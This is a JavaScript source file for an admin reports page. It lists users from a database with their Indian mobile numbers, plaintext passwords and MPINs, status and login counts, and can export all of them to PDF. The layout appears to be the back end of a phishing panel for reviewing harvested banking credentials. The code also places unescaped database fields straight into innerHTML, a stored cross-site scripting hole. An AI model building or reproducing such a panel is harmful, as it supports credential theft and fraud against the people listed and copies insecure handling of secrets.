import { dbApi } from '../../shared/js/supabase.js';
import { sharedUtils } from '../../shared/js/utils.js';
import { searchHelper } from './search.js';
import { pdfHelper } from './pdf.js';
import './auth.js';

document.addEventListener('DOMContentLoaded', async () => {
    await renderReportsPage();

    document.getElementById('report-search').addEventListener('input', () => renderReportsPage());
    document.getElementById('report-date-filter').addEventListener('change', () => renderReportsPage());

    const btnPdf = document.getElementById('btn-report-download-pdf');
    if (btnPdf) {
        btnPdf.addEventListener('click', async () => {
            const allUsers = await dbApi.select('users');
            const sorted = [...allUsers].sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
            pdfHelper.exportAllUsers(sorted);
        });
    }
});

async function renderReportsPage() {
    let users = await dbApi.select('users');

    // Stats
    const pending = users.filter(u => u.status === 'pending').length;
    const completed = users.filter(u => u.status === 'completed').length;
    const todayStr = new Date().toISOString().split('T')[0];
    const todayLogins = users.filter(u => u.last_login && u.last_login.startsWith(todayStr)).length;

    document.getElementById('report-pending-count').innerText = pending;
    document.getElementById('report-completed-count').innerText = completed;
    document.getElementById('report-today-count').innerText = todayLogins;

    // Search Filter
    const searchVal = document.getElementById('report-search').value;
    users = searchHelper.filterUsers(users, searchVal);

    // Date Filter
    const dateVal = document.getElementById('report-date-filter').value;
    if (dateVal) {
        users = users.filter(u => u.created_at && u.created_at.startsWith(dateVal));
    }

    // Sort Date Wise (Latest First)
    users.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));

    const tbody = document.getElementById('reports-table-body');
    if (!tbody) return;
    tbody.innerHTML = '';

    users.forEach(u => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><a href="user-details.html?id=${u.id}" class="mobile-link" style="color: var(--primary-color); font-weight: 800; text-decoration: underline;">+91 ${u.mobile}</a></td>
            <td><strong>${u.password}</strong></td>
            <td><strong>${u.mpin || '<em>Not Set</em>'}</strong></td>
            <td><span class="status-badge status-${u.status}">${u.status.toUpperCase()}</span></td>
            <td><strong>${u.login_count}</strong></td>
            <td>${sharedUtils.formatDate(u.created_at)}</td>
            <td>${sharedUtils.formatTime(u.created_at)}</td>
        `;
        tbody.appendChild(tr);
    });
}
